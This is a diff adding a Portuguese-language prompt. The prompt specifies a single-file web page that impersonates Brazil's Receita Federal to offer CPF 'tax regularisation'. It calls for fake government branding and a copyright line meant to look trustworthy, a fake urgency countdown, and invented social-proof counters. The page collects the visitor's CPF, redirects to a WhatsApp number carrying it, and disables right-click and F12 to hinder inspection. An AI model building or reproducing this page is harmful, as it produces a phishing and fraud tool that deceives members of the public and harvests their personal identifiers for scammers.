@@ -1,0 +1,40 @@
+Crie um arquivo único index.html com os seguintes requisitos:
+
+1 — Cabeçalho:
+   - Título: “Regularização Fiscal – CPF | RFBr”
+   - Favicon: crie um base64 de 16×16 com o tipo “image/x-icon” (círculo azul #003580 com letras brancas “RF”).
+   - Meta description: “Consulte se seu CPF possui pendências fiscais. Regularização em até 65% desconto. 5 minutos.”
+
+2 — Cor:
+   - Background geral #FFFFFF; header fundo #003580; texto header #FFFFFF.
+   - Botão principal: fundo #D32F2F (vermelho intenso), texto branco, borda-radius 4 px.
+   - Botão sticky (footer): mesma cor, posição fixed-bottom, altura 52 px, largura 100%, texto “Consultar Agora – 02:45:18”.
+
+3 — Timer:
+   - Inicie em 02:45:18 e decresça em tempo real; ao zerar, mostre “Consulta encerrada – nova janela em 24 h” e desabilite botão.
+
+4 — Prova social:
+   - Exiba <span id="pessoas">4.312</span> consultas nos últimos 15 min. Incremente +1 a cada 4 s de forma aleatória (para parecer orgânico).
+
+5 — Campo CPF:
+   - Input com máscara XXX.XXX.XXX-XX; aplique via JS puro (oninput).
+   - Após completar 11 dígitos, habilite o botão; antes fique disabled.
+
+6 — Intermédio:
+   - Ao clicar no botão, faça fadeOut da landing e fadeIn de nova <div id="load"> contendo:
+        “Localizando informações vinculadas ao CPF 123.445.***-XX… isso leva ~5 segundos” + barra de progresso CSS (0→100% em 5 s).
+   - Ao 100%, redirecione para: 
+        https://wa.me/55{numero}?text=Ola!%20CPF%20123.445.{dig}%20-%20quero%20quitar%20desconto
+
+7 — Privacidade / footer:
+   - Inclua texto pequeno “© 2026 Receita Federal – Consulta pública de CPF.” (isso ajuda o adesivo de “confiável” no olho do visitante).
+
+8 — Scripts inline (dentro de <script>):
+   - timer(), mascaraCPF(), incrementaSocial(), redirectWa().
+   - Desative clique-direito e F12 (previne inspect element casual).
+
+9 — SEO quick:
+   - Use <h1> apenas uma vez: “Consultar Situação Fiscal do CPF – Regularização Imediata”.
+   - Imagem do banner mantenha alt=”Notícias Receita Federal 2026″ mesmo que o jpg suma; assim o HTML fica completo.
+
+Entregue tudo em index.html com CSS e JS inline.
